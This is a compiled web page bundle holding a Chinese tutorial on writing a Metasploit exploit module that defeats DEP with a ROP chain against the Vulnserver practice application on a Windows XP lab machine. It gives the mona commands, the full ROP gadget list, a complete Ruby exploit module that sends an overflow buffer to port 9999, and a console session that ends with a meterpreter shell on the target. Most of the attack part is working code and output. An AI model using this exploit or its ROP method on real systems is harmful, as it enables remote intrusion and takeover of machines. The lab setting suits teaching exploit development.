import{i as e,r as t,s as n,t as r}from"./app-BJaruqUz.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-04-17-025-%E4%BD%BF%E7%94%A8Metasploit%E7%BC%96%E5%86%99%E7%BB%95%E8%BF%87DEP%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97.html","title":"使用Metasploit编写绕过DEP渗透模块","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"使用Metasploit编写绕过DEP渗透模块","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"使用Metasploit编写绕过DEP渗透模块","lock":"need"},"git":{"updatedTime":1777440700000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"fd547ca49fe6afef55548f7a0aeaeb4eca279a4d","time":1777440700000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-04-17-025-使用Metasploit编写绕过DEP渗透模块.md"}`),a={name:`2022-04-17-025-使用Metasploit编写绕过DEP渗透模块.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="使用metasploit编写绕过dep渗透模块" tabindex="-1"><a class="header-anchor" href="#使用metasploit编写绕过dep渗透模块"><span>使用Metasploit编写绕过DEP渗透模块</span></a></h1><p>攻击机 Kali 192.168.109.137</p><p>靶机 WinXP 192.168.109.141 (也可为其他Win系统，设置为DEP保护)</p><p>应用程序 Vulnserver(可以到链接： https://download.csdn.net/download/l1028386804/10921905 下载)</p><h2 id="将靶机设置dep保护" tabindex="-1"><a class="header-anchor" href="#将靶机设置dep保护"><span>将靶机设置DEP保护</span></a></h2><p>**数据执行保护（Data Execution Prevention，DEP）**是一种将特定内存区域标记为不可执行的保护机制，这种机制会导致我们在渗透过程中无法执行ShellCode。因此，即使我们可以改写EIP寄存器中的内容并成功地将ESP指向了ShellCode的起始地址，也无法执行攻击载荷。这是因为DEP的存在组织了内存中可写区域（例如栈和堆）中数据的执行。在这种情况下，我们必须使用可执行区域中的现存指令实现预期的功能——可以通过将所有的可执行指令放置成一个可以让跳转跳到ShellCode的顺序来实现这一目的。</p><p>绕过DEP的技术被称为返回导向编程（Return Oriented Programming，ROP）技术，它不同于通过覆盖改写EIP内容，并跳转到ShellCode栈溢出的普通方法。当DEP启用之后，我们将无法使用这种技术，因为栈中的数据是不能执行的。因此我们不再跳转到ShellCode，而是调用第一个ROP指令片段（gadget）。这些指令片段共同构成一个链式结构，一个指令片段会返回下一个指令片段，而不执行栈中的任何代码。</p><p>具体操作如下：</p><p>右键&quot;我的电脑&quot;-&gt;属性-&gt;高级-&gt;性能设置-&gt;数据执行保存-&gt;选择“为除下列选定程序之外的所有程序和服务启用DEP (U)”-&gt;确定</p><p><img src="https://img-blog.csdnimg.cn/20190117125342351.png" alt="img"></p><h2 id="开启vlunserver监听" tabindex="-1"><a class="header-anchor" href="#开启vlunserver监听"><span>开启Vlunserver监听</span></a></h2><p>在靶机的命令行中切换到vlunserver.exe所在的目录，执行如下命令</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">vlunserver.exe 9999</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>监听9999端口</p><p><img src="https://img-blog.csdnimg.cn/20190117125430253.png" alt="img"></p><h2 id="开启immunitydebugger" tabindex="-1"><a class="header-anchor" href="#开启immunitydebugger"><span>开启ImmunityDebugger</span></a></h2><p><img src="https://img-blog.csdnimg.cn/20190117125458129.png" alt="img"></p><h2 id="将vulnserver进程加载到immunitydebugger" tabindex="-1"><a class="header-anchor" href="#将vulnserver进程加载到immunitydebugger"><span>将Vulnserver进程加载到ImmunityDebugger</span></a></h2><p>依次选择ImmunityDebugger的File-&gt;Attach</p><p><img src="https://img-blog.csdnimg.cn/20190117125523794.png" alt="img"></p><p>显示靶机所有进程的信息</p><p><img src="https://img-blog.csdnimg.cn/20190117125536289.png" alt="img"></p><p>我们选中Vulnserver进程并单击右下角的Attach按钮</p><p><img src="https://img-blog.csdnimg.cn/20190117125551775.png" alt="img"></p><p>显示Vulnserver进程的运行信息</p><p><img src="https://img-blog.csdnimg.cn/20190117125607172.png" alt="img"></p><p>此时看到Vulnserver进程处于暂停状态，我们需要点击ImmunityDebugger的Play按钮</p><p><img src="https://img-blog.csdnimg.cn/20190117125620946.png" alt="img"></p><p>此时，看到Vulnserver处于运行状态</p><p><img src="https://img-blog.csdnimg.cn/20190117125639410.png" alt="img"></p><h2 id="查找vulnserver运行时加载的所有dll信息" tabindex="-1"><a class="header-anchor" href="#查找vulnserver运行时加载的所有dll信息"><span>查找Vulnserver运行时加载的所有DLL信息</span></a></h2><p>在ImmunityDebugger的命令行输入如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">!mona modules</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="https://img-blog.csdnimg.cn/20190117125708628.png" alt="img"></p><h2 id="将msvcrt-dll上传到kali的-root目录下" tabindex="-1"><a class="header-anchor" href="#将msvcrt-dll上传到kali的-root目录下"><span>将msvcrt.dll上传到Kali的/root目录下</span></a></h2><p>这里我们将靶机的C:\\Windows\\system32\\msvcrt.dll上传到Kali的/root目录下。</p><h2 id="查找rop指令片段" tabindex="-1"><a class="header-anchor" href="#查找rop指令片段"><span>查找ROP指令片段</span></a></h2><p>这里，我们使用到的工具是Metasploit的msfrop，在Kali的命令行输入：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">msfrop -v -s &quot;pop cex&quot; /root/msvcrt.dll</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>输出太多，这里只截取一部分：</p><p><img src="https://img-blog.csdnimg.cn/20190117125804744.png" alt="img"></p><h2 id="创建rop链" tabindex="-1"><a class="header-anchor" href="#创建rop链"><span>创建ROP链</span></a></h2><p>在ImmunityDebugger命令行输入如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">!mona rop -m *.dll -cp nonull</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="https://img-blog.csdnimg.cn/20190117125843386.png" alt="img"></p><p>执行后会在ImmunityDebugger安装目录下生成一个rop_chains.txt文件</p><p><img src="https://img-blog.csdnimg.cn/20190117125857534.png" alt="img"></p><p>我们打开rop_chains.txt文件，找到如下代码片段：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">def create_rop_chain()</span>
<span class="line"></span>
<span class="line">  # rop chain generated with mona.py - www.corelan.be</span>
<span class="line">  rop_gadgets = </span>
<span class="line">  [</span>
<span class="line">    0x77bfc038,  # POP ECX # RETN [msvcrt.dll] </span>
<span class="line">    0x6250609c,  # ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span>
<span class="line">    0x77d5373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] </span>
<span class="line">    0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll] </span>
<span class="line">    0x77c11c54,  # POP EBP # RETN [msvcrt.dll] </span>
<span class="line">    0x625011bb,  # &amp; jmp esp [essfunc.dll]</span>
<span class="line">    0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] </span>
<span class="line">    0xfffffdff,  # Value to negate, will become 0x00000201</span>
<span class="line">    0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] </span>
<span class="line">    0x77dc560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] </span>
<span class="line">    0x77f01564,  # POP EAX # RETN [GDI32.dll] </span>
<span class="line">    0xffffffc0,  # Value to negate, will become 0x00000040</span>
<span class="line">    0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] </span>
<span class="line">    0x77ef24c8,  # XCHG EAX,EDX # RETN [GDI32.dll] </span>
<span class="line">    0x77c0eb4f,  # POP ECX # RETN [msvcrt.dll] </span>
<span class="line">    0x7c99f17e,  # &amp;Writable location [ntdll.dll]</span>
<span class="line">    0x77c17641,  # POP EDI # RETN [msvcrt.dll] </span>
<span class="line">    0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]</span>
<span class="line">    0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] </span>
<span class="line">    0x90909090,  # nop</span>
<span class="line">    0x60fe4479,  # PUSHAD # RETN [hnetcfg.dll] </span>
<span class="line">  ].flatten.pack(&quot;V*&quot;)</span>
<span class="line"></span>
<span class="line">  return rop_gadgets</span>
<span class="line"></span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="https://img-blog.csdnimg.cn/2019011712593726.png" alt="img"></p><p>之后，将这段代码拷贝到我们自己编写的渗透模块中。</p><h2 id="编写绕过dep的metasploit模块脚本dep-attack-by-binghe-rb" tabindex="-1"><a class="header-anchor" href="#编写绕过dep的metasploit模块脚本dep-attack-by-binghe-rb"><span>编写绕过DEP的Metasploit模块脚本dep_attack_by_binghe.rb</span></a></h2><p>不多说，直接上代码：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">##</span>
<span class="line"># Author 冰河</span>
<span class="line"># Date 2019-01-16</span>
<span class="line"># Description Metasploit绕过DEP</span>
<span class="line">##</span>
<span class="line"></span>
<span class="line">require &#39;msf/core&#39;</span>
<span class="line">class Metasploit3 &lt; Msf::Exploit::Remote</span>
<span class="line">  Rank = NormalRanking</span>
<span class="line">  </span>
<span class="line">  include Msf::Exploit::Remote::Tcp</span>
<span class="line">  </span>
<span class="line">  def initialize(info = {})</span>
<span class="line">    super(update_info(info,</span>
<span class="line">      &#39;Name&#39;           =&gt; &#39;DEP Bypass Exploit&#39;,</span>
<span class="line">      &#39;Description&#39;    =&gt; %q{</span>
<span class="line">        DEP Bypass Using ROP Chains Example Module</span>
<span class="line">      },</span>
<span class="line">      &#39;Platform&#39;       =&gt; &#39;Windows&#39;,</span>
<span class="line">      &#39;Author&#39;         =&gt; [&#39;binghe&#39;],</span>
<span class="line">      &#39;Payload&#39;        =&gt;</span>
<span class="line">        {</span>
<span class="line">          &#39;space&#39;     =&gt; 312,</span>
<span class="line">          &#39;BadChars&#39;  =&gt; &quot;\\x00&quot;</span>
<span class="line">        },</span>
<span class="line">       &#39;Targets&#39;      =&gt; </span>
<span class="line">        [</span>
<span class="line">          [&#39;Windows XP&#39;, {&#39;Offset&#39;  =&gt; 2006}]</span>
<span class="line">        ],</span>
<span class="line">        &#39;DisclosureDate&#39;  =&gt; &#39;2019-01-16&#39;))</span>
<span class="line">     </span>
<span class="line">     register_options(</span>
<span class="line">      [</span>
<span class="line">        Opt::RPORT(9999)</span>
<span class="line">      ],self.class)</span>
<span class="line">  end</span>
<span class="line">  </span>
<span class="line">   def create_rop_chain()</span>
<span class="line"></span>
<span class="line">    # rop chain generated with mona.py - www.corelan.be</span>
<span class="line">    rop_gadgets = </span>
<span class="line">    [</span>
<span class="line">      0x77bfc038,  # POP ECX # RETN [msvcrt.dll] </span>
<span class="line">      0x6250609c,  # ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span>
<span class="line">      0x77d5373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] </span>
<span class="line">      0x7c96d192,  # XCHG EAX,ESI # RETN [ntdll.dll] </span>
<span class="line">      0x77c11c54,  # POP EBP # RETN [msvcrt.dll] </span>
<span class="line">      0x625011bb,  # &amp; jmp esp [essfunc.dll]</span>
<span class="line">      0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] </span>
<span class="line">      0xfffffdff,  # Value to negate, will become 0x00000201</span>
<span class="line">      0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] </span>
<span class="line">      0x77dc560a,  # XCHG EAX,EBX # RETN [ADVAPI32.dll] </span>
<span class="line">      0x77f01564,  # POP EAX # RETN [GDI32.dll] </span>
<span class="line">      0xffffffc0,  # Value to negate, will become 0x00000040</span>
<span class="line">      0x77e6d222,  # NEG EAX # RETN [RPCRT4.dll] </span>
<span class="line">      0x77ef24c8,  # XCHG EAX,EDX # RETN [GDI32.dll] </span>
<span class="line">      0x77c0eb4f,  # POP ECX # RETN [msvcrt.dll] </span>
<span class="line">      0x7c99f17e,  # &amp;Writable location [ntdll.dll]</span>
<span class="line">      0x77c17641,  # POP EDI # RETN [msvcrt.dll] </span>
<span class="line">      0x77e6d224,  # RETN (ROP NOP) [RPCRT4.dll]</span>
<span class="line">      0x77c04fcd,  # POP EAX # RETN [msvcrt.dll] </span>
<span class="line">      0x90909090,  # nop</span>
<span class="line">      0x60fe4479,  # PUSHAD # RETN [hnetcfg.dll] </span>
<span class="line">    ].flatten.pack(&quot;V*&quot;)</span>
<span class="line"></span>
<span class="line">    return rop_gadgets</span>
<span class="line"></span>
<span class="line">  end</span>
<span class="line">  </span>
<span class="line">  def exploit</span>
<span class="line">    connect</span>
<span class="line">    rop_chain = create_rop_chain()</span>
<span class="line">    junk = rand_text_alpha_upper(target[&#39;Offset&#39;])</span>
<span class="line">    buf = &quot;TRUN .&quot; + junk + rop_chain + make_nops(16) + payload.encoded + &#39;\\r\\n&#39;</span>
<span class="line">    sock.put(buf)</span>
<span class="line">    handler</span>
<span class="line">    disconnect</span>
<span class="line">  end</span>
<span class="line">  </span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中，def create_rop_chain()方法就是从第8步创建的rop_chains.txt文件中复制来的。</p><h2 id="上传脚本dep-attack-by-binghe-rb" tabindex="-1"><a class="header-anchor" href="#上传脚本dep-attack-by-binghe-rb"><span>上传脚本dep_attack_by_binghe.rb</span></a></h2><p>将脚本dep_attack_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit目录下。</p><h2 id="关闭immunitydebugger重新启动vulnserver" tabindex="-1"><a class="header-anchor" href="#关闭immunitydebugger重新启动vulnserver"><span>关闭ImmunityDebugger重新启动Vulnserver</span></a></h2><p>在靶机上关闭ImmunityDebugger并重新启动Vulnserver。</p><p><img src="https://img-blog.csdnimg.cn/20190117130049549.png" alt="img"></p><h2 id="在kali上执行" tabindex="-1"><a class="header-anchor" href="#在kali上执行"><span>在Kali上执行</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">use exploit/windows/masteringmetasploit/dep_attack_by_binghe </span>
<span class="line">set payload windows/meterpreter/bind_tcp</span>
<span class="line">set RHOST 192.168.109.141</span>
<span class="line">show options</span>
<span class="line">exploit</span>
<span class="line">ifconfig</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>具体操作如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf &gt; use exploit/windows/masteringmetasploit/dep_attack_by_binghe </span>
<span class="line">msf exploit(windows/masteringmetasploit/dep_attack_by_binghe) &gt; set payload windows/meterpreter/bind_tcp</span>
<span class="line">payload =&gt; windows/meterpreter/bind_tcp</span>
<span class="line">msf exploit(windows/masteringmetasploit/dep_attack_by_binghe) &gt; set RHOST 192.168.109.141</span>
<span class="line">RHOST =&gt; 192.168.109.141</span>
<span class="line">msf exploit(windows/masteringmetasploit/dep_attack_by_binghe) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (exploit/windows/masteringmetasploit/dep_attack_by_binghe):</span>
<span class="line"></span>
<span class="line">   Name   Current Setting  Required  Description</span>
<span class="line">   ----   ---------------  --------  -----------</span>
<span class="line">   RHOST  192.168.109.141  yes       The target address</span>
<span class="line">   RPORT  9999             yes       The target port (TCP)</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options (windows/meterpreter/bind_tcp):</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span>
<span class="line">   LPORT     4444             yes       The listen port</span>
<span class="line">   RHOST     192.168.109.141  no        The target address</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   0   Windows XP</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf exploit(windows/masteringmetasploit/dep_attack_by_binghe) &gt; exploit</span>
<span class="line"></span>
<span class="line">[*] Started bind TCP handler against 192.168.109.141:4444</span>
<span class="line">[*] Sending stage (179779 bytes) to 192.168.109.141</span>
<span class="line"></span>
<span class="line">meterpreter &gt; ifconfig</span>
<span class="line"></span>
<span class="line">Interface  1</span>
<span class="line">============</span>
<span class="line">Name         : MS TCP Loopback interface</span>
<span class="line">Hardware MAC : 00:00:00:00:00:00</span>
<span class="line">MTU          : 1520</span>
<span class="line">IPv4 Address : 127.0.0.1</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Interface 65539</span>
<span class="line">============</span>
<span class="line">Name         : VMware Accelerated AMD PCNet Adapter</span>
<span class="line">Hardware MAC : 00:0c:29:5d:8e:d4</span>
<span class="line">MTU          : 1500</span>
<span class="line">IPv4 Address : 192.168.109.141</span>
<span class="line">IPv4 Netmask : 255.255.255.0</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Interface 65540</span>
<span class="line">============</span>
<span class="line">Name         : Bluetooth �)%</span>
<span class="line">Hardware MAC : 3c:a0:67:1a:fe:b4</span>
<span class="line">MTU          : 1500</span>
<span class="line"></span>
<span class="line">meterpreter &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功拿到Meterpreter的Shell。所以，设置系统的DEP保护，对我们来说并没有什么卵用。</p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,68)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};